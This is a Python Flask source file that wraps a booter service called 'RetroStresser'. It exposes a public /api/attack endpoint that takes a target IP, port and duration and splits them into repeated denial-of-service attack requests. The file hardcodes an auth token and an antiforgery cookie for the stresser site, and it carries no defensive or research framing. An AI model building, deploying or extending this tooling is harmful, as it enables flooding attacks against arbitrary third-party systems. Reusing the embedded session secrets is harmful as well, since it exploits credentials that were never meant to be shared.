import requests
import time
import json
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

class RetroStresser:
    def __init__(self, auth_token=None):
        self.session = requests.Session()
        self.base_url = "https://retrostress.net"
        self.auth_token = auth_token or "517f13d366214d958526a1c7591931818808e175d10842d7b271c0ff14138799"
        
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': '*/*',
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': f'{self.base_url}/panel'
        })
        
        self.session.cookies.set('auth_token', self.auth_token)
        
        # Set antiforgery token
        antiforgery = "CfDJ8Bna8lCn_z1AiiMxA8_ANy0js9s2--epYdS_D4OS73xgQWTmnHzob2h54ETv3HyqJy1-4P4UjxafkPZ6L4g0mRnkRkDZ1cmFfq7xGf03e7xVRJHUB0eRBhXqlUAibNFIJggVrTIay4LCKhfRnqNA5sQ"
        self.session.cookies.set('.AspNetCore.Antiforgery.pFk19hAmY3k', antiforgery)

    def send_attack(self, ip, port, duration):
        """Send single attack request"""
        attack_url = "http://127.0.0.1:8080/api"
        
        params = {
            'ip': ip,
            'port': port,
            'time': duration
        }
        
        try:
            response = self.session.get(attack_url, params=params, timeout=10)
            return response.status_code == 200
        except Exception as e:
            print(f"Error: {e}")
            return False

    def execute_attack(self, ip, port, total_time):
        """Execute attack with time splitting"""
        if total_time < 30:
            total_time = 30
        
        attacks = []
        while total_time > 0:
            if total_time >= 60:
                attacks.append(60)
                total_time -= 60
            else:
                if total_time >= 30:
                    attacks.append(total_time)
                else:
                    if attacks:
                        attacks[-1] += total_time
                    else:
                        attacks.append(total_time)
                break
        
        results = []
        for i, duration in enumerate(attacks, 1):
            success = self.send_attack(ip, port, duration)
            results.append({
                'attack': i,
                'duration': duration,
                'success': success
            })
            if success:
                time.sleep(duration)
        
        return {
            'target': f"{ip}:{port}",
            'total_attacks': len(attacks),
            'results': results
        }

# Initialize stresser
stresser = RetroStresser()

@app.route('/api/attack', methods=['GET', 'POST'])
def attack():
    """API endpoint for attacks"""
    if request.method == 'GET':
        ip = request.args.get('ip')
        port = request.args.get('port')
        time_sec = request.args.get('time')
    else:
        data = request.json
        ip = data.get('ip')
        port = data.get('port')
        time_sec = data.get('time')
    
    if not all([ip, port, time_sec]):
        return jsonify({'error': 'Missing parameters: ip, port, time required'}), 400
    
    try:
        port = int(port)
        time_sec = int(time_sec)
        
        result = stresser.execute_attack(ip, port, time_sec)
        return jsonify(result)
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/status', methods=['GET'])
def status():
    """Status check endpoint"""
    return jsonify({
        'status': 'running',
        'auth_token': stresser.auth_token[:20] + '...',
        'base_url': stresser.base_url
    })

@app.route('/api/health', methods=['GET'])
def health():
    """Health check for Railway"""
    return jsonify({'status': 'healthy', 'timestamp': time.time()}), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
